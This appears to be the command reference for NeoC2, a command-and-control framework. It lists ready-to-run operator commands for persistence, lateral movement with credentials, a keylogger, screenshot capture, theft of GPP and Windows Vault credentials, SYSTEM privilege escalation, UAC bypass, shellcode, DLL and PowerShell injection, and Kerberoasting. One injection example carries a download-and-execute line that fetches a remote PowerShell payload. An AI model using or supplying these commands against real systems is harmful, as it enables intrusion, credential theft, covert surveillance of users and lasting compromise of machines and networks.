# NeoC2 Module Command Syntax

## General Syntax

```
run <module_name> <agent_id> <option>=<value>

# IN INTERACTIVE MODE - OPERATORS DO NOT HAVE TO SPECIFY agent_id THE CUURENT AGENT IS AUTOMATICALLY USED
run <module_name> <option>=<value>
```

## Available Modules

### Persistence Module

The `persistence` module establishes persistence on systems using various techniques.

#### Required Options:
- `agent_id`: ID of the agent to establish persistence on
- `method`: Persistence method (registry, startup, cron, launchd, systemd, or service)
- `payload_path`: Path to the payload/script to persist

#### Optional Options:
- `name`: Name for the persistence mechanism (default: "SystemUpdate")
- `interval`: Interval for scheduled tasks (minutes, only for cron/systemd) (default: "60")

#### Examples:

**Linux/macOS Cron Persistence:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh
```

**Windows Registry Persistence:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe
```

**Windows Startup Folder:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe
```

**Windows Service:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater
```

**Linux Systemd Service:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30
```

**macOS LaunchAgent:**
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
```

### Lateral Movement Module

The `lateral_movement` module executes techniques to move laterally across systems in a network.

#### Required Options:
- `agent_id`: ID of the source agent to execute lateral movement from
- `target`: Target system or IP address for lateral movement
- `technique`: Lateral movement technique (wmi, smb, ssh, psexec, rdp, dcom, winrm)
- `payload_path`: Path to payload to execute on target system

#### Optional Options:
- `credentials`: Credentials for target system (format: domain\\username:password or username@domain:password)
- `method`: Execution method on target: execute, upload_execute, or service (default: "execute")
- `timeout`: Connection timeout in seconds (default: "30")

#### Examples:

**WMI Lateral Movement:**
```
run lateral_movement agent_id=abc123-4567-8901-2345-67890abcdef1 target=192.168.1.100 technique=wmi payload_path=C:\temp\payload.exe
```

**WMI with Credentials:**
```
run lateral_movement agent_id=abc123-4567-8901-2345-67890abcdef1 target=192.168.1.101 technique=wmi payload_path=C:\temp\payload.exe credentials=DOMAIN\\admin:password123
```

**SSH Lateral Movement:**
```
run lateral_movement agent_id=abc123-4567-8901-2345-67890abcdef1 target=192.168.1.102 technique=ssh payload_path=/tmp/payload.sh credentials=user:password
```

**PsExec Lateral Movement:**
```
run lateral_movement agent_id=abc123-4567-8901-2345-67890abcdef1 target=192.168.1.103 technique=psexec payload_path=C:\temp\payload.exe credentials=DOMAIN\\admin:password123
```

**DCOM Lateral Movement:**
```
run lateral_movement agent_id=abc123-4567-8901-2345-67890abcdef1 target=192.168.1.104 technique=dcom payload_path=C:\temp\payload.exe
```

**WinRM Lateral Movement:**
```
run lateral_movement agent_id=abc123-4567-8901-2345-67890abcdef1 target=192.168.1.105 technique=winrm payload_path=C:\temp\payload.exe credentials=DOMAIN\\admin:password123
```

### Keylogger Module

The `keylogger` module executes a PowerShell keylogger that logs keystrokes to a file.

#### Required Options:
- `agent_id`: ID of the agent to run the keylogger on

#### Optional Options:
- `log_path`: Path where keystrokes will be logged (default: `%TEMP%\key.log`)
- `timeout`: Time in minutes to capture keystrokes (default: runs indefinitely)

#### Examples:

**Basic Keylogger:**
```
run keylogger agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Keylogger with Custom Log Path:**
```
run keylogger agent_id=abc123-4567-8901-2345-67890abcdef1 log_path=C:\Users\Public\keystrokes.log
```

**Keylogger with Timeout:**
```
run keylogger agent_id=abc123-4567-8901-2345-67890abcdef1 log_path=%TEMP%\capture.log timeout=30
```

### Get-GPPPassword Module

The `Get-GPPPassword` module retrieves plaintext passwords from Group Policy Preferences (GPP) files. It searches for groups.xml, scheduledtasks.xml, services.xml, and datasources.xml files that may contain encrypted passwords and decrypts them.

#### Required Options:
- `agent_id`: ID of the agent to run the GPP password retrieval on

#### Optional Options:
- `server`: Specify the domain controller to search for (default: current domain)
- `search_forest`: Search all reachable trusts and SYSVOLs (true/false) (default: "false")

#### Examples:

**Basic Get-GPPPassword:**
```
run Get-GPPPassword agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Get-GPPPassword with Specific Server:**
```
run Get-GPPPassword agent_id=abc123-4567-8901-2345-67890abcdef1 server=dc01.domain.local
```

**Get-GPPPassword with Forest Search:**
```
run Get-GPPPassword agent_id=abc123-4567-8901-2345-67890abcdef1 search_forest=true
```

**Get-GPPPassword with All Options:**
```
run Get-GPPPassword agent_id=abc123-4567-8901-2345-67890abcdef1 server=dc01.domain.local search_forest=true
```

### Screenshot Module

The `screenshot` module executes a PowerShell timed screenshot capture that saves screenshots to a specified path.

#### Required Options:
- `agent_id`: ID of the agent to run the screenshot capture on

#### Optional Options:
- `path`: Path where screenshots will be saved (default: `%TEMP%`)
- `interval`: Interval in seconds between taking screenshots (default: "30")
- `end_time`: Time when the script should stop running (format: HH:MM, e.g., 14:00) (default: "23:59")

#### Examples:

**Basic Screenshot:**
```
run screenshot agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Screenshot with Custom Path and Interval:**
```
run screenshot agent_id=abc123-4567-8901-2345-67890abcdef1 path=C:\Users\Public interval=60
```

**Screenshot with End Time:**
```
run screenshot agent_id=abc123-4567-8901-2345-67890abcdef1 path=%TEMP% interval=20 end_time=18:00
```

**Screenshot with Custom Settings:**
```
run screenshot agent_id=abc123-4567-8901-2345-67890abcdef1 path=C:\Temp interval=45 end_time=16:30
```

### Get-VaultCredential Module

The `getvaultcreds` module retrieves credentials from the Windows Vault, including cleartext web credentials. It enumerates and displays all credentials stored in the Windows vault.

#### Required Options:
- `agent_id`: ID of the agent to run the vault credential retrieval on

#### Examples:

**Basic Get-VaultCredential:**
```
run getvaultcreds agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Get-VaultCredential:**
```
run getvaultcreds agent_id=abc123-4567-8901-2345-67890abcdef1
```

### Get-System Module

The `getsystem` module executes a PowerShell privilege escalation technique inspired by Meterpreter's getsystem functionality. It can use either named pipe impersonation or token duplication to elevate privileges to SYSTEM.

#### Required Options:
- `agent_id`: ID of the agent to run the privilege escalation on

#### Optional Options:
- `technique`: The technique to use: 'NamedPipe' or 'Token' (default: "NamedPipe")
- `service_name`: The name of the service used with named pipe impersonation (default: "TestSVC")
- `pipe_name`: The name of the named pipe used with named pipe impersonation (default: "TestSVC")

#### Examples:

**Basic Get-System (NamedPipe):**
```
run getsystem agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Get-System with Token Technique:**
```
run getsystem agent_id=abc123-4567-8901-2345-67890abcdef1 technique=Token
```

**Get-System with Custom Service and Pipe Names:**
```
run getsystem agent_id=abc123-4567-8901-2345-67890abcdef1 technique=NamedPipe service_name=MyService pipe_name=MyPipe
```

**Get-System with Token Technique:**
```
run getsystem agent_id=abc123-4567-8901-2345-67890abcdef1 technique=Token
```

### PowerUp Module

The `PowerUp` module executes a PowerShell PowerUp script for Windows privilege escalation enumeration. PowerUp contains several functions to enumerate and exploit common Windows privilege escalation vectors.

#### Required Options:
- `agent_id`: ID of the agent to run PowerUp enumeration on

#### Optional Options:
- `function`: The PowerUp function to execute (default: "Invoke-AllChecks"). Available functions include privilege escalation checks: AllChecks, Get-ServicePerms, Get-ModifiableServiceFile, Get-ModifiableService, Get-UnquotedService, Get-VulnAutoRun, Get-VulnDCOM, Get-VulnSchTask, Get-RegistryAlwaysInstallElevated, Get-RegistryAutoLogon, Get-ModifiablePath, Get-ProcessTokenGroup, Invoke-AllChecks, Write-UserAddService, Write-ServiceEXE, Write-UserAddCommand, Write-ServicePowerShellCommand
- `arguments`: Additional arguments to pass to the PowerUp function (optional)

#### Examples:

**Basic PowerUp All Checks:**
```
run PowerUp agent_id=abc123-4567-8901-2345-67890abcdef1
```

**PowerUp with Specific Function:**
```
run PowerUp agent_id=abc123-4567-8901-2345-67890abcdef1 function=Get-ModifiableService
```

**PowerUp with Arguments:**
```
run PowerUp agent_id=abc123-4567-8901-2345-67890abcdef1 function=Get-ServicePerms arguments="-ServiceName MyService"
```

**PowerUp with All Checks:**
```
run PowerUp agent_id=abc123-4567-8901-2345-67890abcdef1 function=Invoke-AllChecks
```

### PowerView Module

The `PowerView` module executes a PowerShell PowerView script for network enumeration and domain assessment. PowerView contains numerous functions for Active Directory reconnaissance and mapping trust relationships within a domain environment.

#### Required Options:
- `agent_id`: ID of the agent to run PowerView enumeration on

#### Optional Options:
- `function`: The PowerView function to execute (default: "Get-Domain"). Available functions include many for domain enumeration: Get-Domain, Get-DomainController, Get-DomainUser, Get-DomainGroup, Get-DomainComputer, Get-DomainGPO, Get-DomainOU, Get-DomainSite, Get-DomainSubnet, Get-DomainTrust, Get-Forest, Get-ForestDomain, Get-ForestGlobalCatalog, Find-DomainUserLocation, Find-DomainGroupMember, Find-DomainShare, Find-LocalAdminAccess, Get-NetSession, Get-NetLoggedon, Invoke-UserHunter, Invoke-ProcessHunter, Invoke-EventHunter, Invoke-ShareFinder, Invoke-FileFinder, Get-DNSServerZone, Get-DomainDNSRecord, Get-NetForestTrust, Get-ADObject, Get-NetGroupMember, Get-NetUser, Get-NetComputer, Get-NetDomainController, Get-NetGPO, Get-NetGPOGroup, Get-DFSshare, Get-NetShare, Get-NetLocalGroupMember, Find-ComputerField, Find-UserField, Get-NetDomainTrust, Get-NetForestTrust, Find-GPOLocation, Get-DomainPolicyData, Get-DomainUserEvent, Get-DomainProcess, Get-DomainUserPermission, Find-ManagedSecurityGroups, Get-DomainTrustMapping, Get-NetDomain
- `arguments`: Additional arguments to pass to the PowerView function (optional)

#### Examples:

**Basic PowerView Domain Information:**
```
run PowerView agent_id=abc123-4567-8901-2345-67890abcdef1
```

**PowerView with Specific Function:**
```
run PowerView agent_id=abc123-4567-8901-2345-67890abcdef1 function=Get-DomainUser
```

**PowerView with Arguments:**
```
run PowerView agent_id=abc123-4567-8901-2345-67890abcdef1 function=Get-DomainComputer arguments="-Properties OperatingSystem,LastLogonDate"
```

**PowerView with User Location:**
```
run PowerView agent_id=abc123-4567-8901-2345-67890abcdef1 function=Find-DomainUserLocation
```

### Invoke-Shellcode Module

The `Invoke-Shellcode` module executes a PowerShell script to inject shellcode into the current or a remote process. This is commonly used for executing payloads such as reverse shells or other malicious code within the context of a process.

#### Required Options:
- `agent_id`: ID of the agent to run Invoke-Shellcode on
- `shellcode`: The shellcode to inject, either as a hex string or a custom shellcode generator command

#### Optional Options:
- `process_id`: Process ID to inject shellcode into (optional, default injects into current process)
- `force_aslr`: Force ASLR compatible shellcode injection (true/false) (default: "false")

#### Examples:

**Basic Shellcode Injection (into current process):**
```
run Invoke-Shellcode agent_id=abc123-4567-8901-2345-67890abcdef1 shellcode="0x90,0x90,0xC3"
```

**Shellcode Injection into Specific Process:**
```
run Invoke-Shellcode agent_id=abc123-4567-8901-2345-67890abcdef1 shellcode="0x90,0x90,0xC3" process_id=1234
```

**Shellcode Injection with ASLR Force:**
```
run Invoke-Shellcode agent_id=abc123-4567-8901-2345-67890abcdef1 shellcode="0x90,0x90,0xC3" force_aslr=true
```

**Shellcode Injection into Specific Process:**
```
run Invoke-Shellcode agent_id=abc123-4567-8901-2345-67890abcdef1 shellcode="0x90,0x90,0xC3" process_id=1234
```

### Invoke-Portscan Module

The `Invoke-Portscan` module executes a PowerShell script to perform network port scanning. This is commonly used for enumerating open ports and services on target systems.

#### Required Options:
- `agent_id`: ID of the agent to run Invoke-Portscan on
- `computer_name`: Target computer name or IP address to scan (supports multiple targets separated by commas)
- `port`: Port or port range to scan (e.g., 80, 1-1000, 22,80,443)

#### Optional Options:
- `ports`: Alternative parameter for specifying ports (for compatibility)
- `timeout`: Timeout in milliseconds for each connection attempt (default: 1000)
- `ping`: Perform ping sweep before port scanning (true/false) (default: false)
- `all_protocols`: Include all protocols in the scan (true/false) (default: false)

#### Examples:

**Basic Port Scan:**
```
run Invoke-Portscan agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.1 port=1-1000
```

**Port Scan with Specific Ports:**
```
run Invoke-Portscan agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.10 port=22,80,443
```

**Port Scan with Ping Sweep:**
```
run Invoke-Portscan agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.0/24 port=80 ping=true
```

**Port Scan with Custom Timeout and All Protocols:**
```
run Invoke-Portscan agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=10.0.0.1 port=1-100 timeout=2000 all_protocols=true
```

### Get-ComputerDetail Module

The `Get-ComputerDetail` module executes a PowerShell script to gather comprehensive system information including OS details, hardware specs, network configuration, and running processes.

#### Required Options:
- `agent_id`: ID of the agent to run Get-ComputerDetail on

#### Optional Options:
- `computer_name`: Target computer name or IP address to enumerate (default: localhost)
- `credentialed_access`: Use alternate credentials for remote enumeration (format: domain\\username:password)
- `property`: Specific property to retrieve (optional, if not specified, all properties will be returned)

#### Examples:

**Basic Computer Detail Enumeration:**
```
run Get-ComputerDetail agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Remote Computer Detail Enumeration:**
```
run Get-ComputerDetail agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.10
```

**Computer Detail with Specific Property:**
```
run Get-ComputerDetail agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.10 property=OSInfo
```

**Computer Detail with Credentials:**
```
run Get-ComputerDetail agent_id=abc123-4567-8901-2345-67890abcdef1 computer_name=192.168.1.10 credentialed_access=DOMAIN\\admin:password123 property=HardwareInfo
```

### Bypass-UAC Module

The `Bypass-UAC` module executes a PowerShell UAC bypass technique using various methods to escape medium integrity level and gain elevated privileges. This module leverages multiple UAC bypass techniques from PowerSploit.

#### Required Options:
- `agent_id`: ID of the agent to run Bypass-UAC on
- `method`: The UAC bypass method to execute (UacMethodSysprep, ucmDismMethod, UacMethodMMC2, UacMethodTcmsetup, UacMethodNetOle32)

#### Optional Options:
- `custom_dll`: Absolute path to custom proxy DLL for the bypass (optional)

#### Examples:

**Basic Bypass-UAC with default method:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodTcmsetup
```

**Bypass-UAC with Sysprep method:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodSysprep
```

**Bypass-UAC with DISM method:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=ucmDismMethod
```
### HostEnum Module

The `HostEnum` module executes a PowerShell comprehensive host enumeration and situational awareness script. It performs local host and/or domain enumeration to gather system information, installed applications, network configuration, processes, services, registry entries, users, groups, security products, and more.

#### Required Options:
- `agent_id`: ID of the agent to run HostEnum on

#### Optional Options:
- `switch`: The HostEnum switch to execute (All, Local, Domain, Privesc, Quick) (default: "Local")
- `html_report`: Generate an HTML report (true/false) (default: "false")

#### Examples:

**Basic HostEnum with Local switch:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Local
```

**HostEnum with Domain enumeration:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Domain
```

**HostEnum with Privesc enumeration:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Privesc
```

**HostEnum with both Local and Domain:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=All
```

**HostEnum with HTML Report:**
```
run HostEnum agent_id=abc123-4567-8901-2345-67890abcdef1 switch=Local html_report=true
```


**Bypass-UAC with MMC method:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodMMC2
```

**Bypass-UAC with custom DLL:**
```
run Bypass-UAC agent_id=abc123-4567-8901-2345-67890abcdef1 method=UacMethodTcmsetup custom_dll=C:\\temp\\malicious.dll
```

### Invoke-DllInjection Module

The `Invoke-DllInjection` module executes a PowerShell script to inject a DLL into a specified process. This technique is commonly used for process injection, code execution, and privilege escalation by loading a malicious DLL into the address space of a target process.

#### Required Options:
- `agent_id`: ID of the agent to run Invoke-DllInjection on
- `process_id`: Process ID of the process to inject the DLL into
- `dll_path`: Path to the DLL file that will be injected into the target process

#### Examples:

**Basic DLL Injection:**
```
run Invoke-DllInjection agent_id=abc123-4567-8901-2345-67890abcdef1 process_id=1234 dll_path=C:\\temp\\malicious.dll
```

**DLL Injection into Explorer Process:**
```
run Invoke-DllInjection agent_id=abc123-4567-8901-2345-67890abcdef1 process_id=5678 dll_path=evil.dll
```

**DLL Injection with Full Path:**
```
run Invoke-DllInjection agent_id=abc123-4567-8901-2345-67890abcdef1 process_id=2109 dll_path=C:\\Windows\\System32\\backdoor.dll
```

### Invoke-PSInject Module

The `Invoke-PSInject` module executes a PowerShell script to inject PowerShell code into a specified process. This technique is commonly used for process injection and code execution by patching PowerShell code into a reflective DLL and injecting it into the target process.

#### Required Options:
- `agent_id`: ID of the agent to run Invoke-PSInject on
- `process_id`: Process ID of the process to inject the PowerShell code into
- `powershell_code`: Base64-encoded PowerShell code to inject into the target process

#### Examples:

**Basic PowerShell Code Injection:**
```
run Invoke-PSInject agent_id=abc123-4567-8901-2345-67890abcdef1 process_id=1234 powershell_code="Write-Output 'Hello from injected code'"
```

**PowerShell Injection into Explorer Process:**
```
run Invoke-PSInject agent_id=abc123-4567-8901-2345-67890abcdef1 process_id=5678 powershell_code="Get-Process"
```

**PowerShell Injection with Complex Command:**
```
run Invoke-PSInject agent_id=abc123-4567-8901-2345-67890abcdef1 process_id=2109 powershell_code="IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
```

## Common Options

- `wait_timeout`: Specify how long to wait for module execution results (default: 0, means no wait)

Example with wait timeout:
```
run persistence agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh wait_timeout=60
```

### Invoke-Kerberoast Module

The `Invoke-Kerberoast` module executes a PowerShell script to request service tickets for accounts with Service Principal Names (SPNs) set, which can be used for offline password cracking. This is a Kerberoasting attack technique that targets service accounts in Active Directory.

#### Required Options:
- `agent_id`: ID of the agent to run Invoke-Kerberoast on

#### Optional Options:
- `identity`: A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201). Wildcards accepted. (default: "")
- `domain`: Specifies the domain to use for the query, defaults to the current domain. (default: "")
- `ldap_filter`: Specifies an LDAP query string that is used to filter Active Directory objects. (default: "")
- `search_base`: The LDAP source to search through, e.g. 'LDAP://OU=secret,DC=testlab,DC=local'. Useful for OU queries. (default: "")
- `server`: Specifies an Active Directory server (domain controller) to bind to. (default: "")
- `output_format`: Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format. (default: "John")
- `delay`: Specifies the delay in seconds between ticket requests. (default: 0)
- `jitter`: Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3 (default: 0.3)

#### Examples:

**Basic Kerberoasting Attack:**
```
run Invoke-Kerberoast agent_id=abc123-4567-8901-2345-67890abcdef1
```

**Kerberoasting with Custom Domain:**
```
run Invoke-Kerberoast agent_id=abc123-4567-8901-2345-67890abcdef1 domain=corp.internal
```

**Kerberoasting with Hashcat Output Format:**
```
run Invoke-Kerberoast agent_id=abc123-4567-8901-2345-67890abcdef1 output_format=Hashcat
```

**Kerberoasting against Specific SPN:**
```
run Invoke-Kerberoast agent_id=abc123-4567-8901-2345-67890abcdef1 identity=svc_webapp
```

**Kerberoasting with Delay Between Requests:**
```
run Invoke-Kerberoast agent_id=abc123-4567-8901-2345-67890abcdef1 delay=5 jitter=0.2
```

## Notes

- The `agent_id` parameter is IMPORTANT for all modules as it specifies which agent should execute the module
- For cross-platform modules, ensure the appropriate method/technique is selected for the target OS
- Some techniques require specific privileges or services to be running on target systems
- Credentials should be formatted properly as shown in the examples
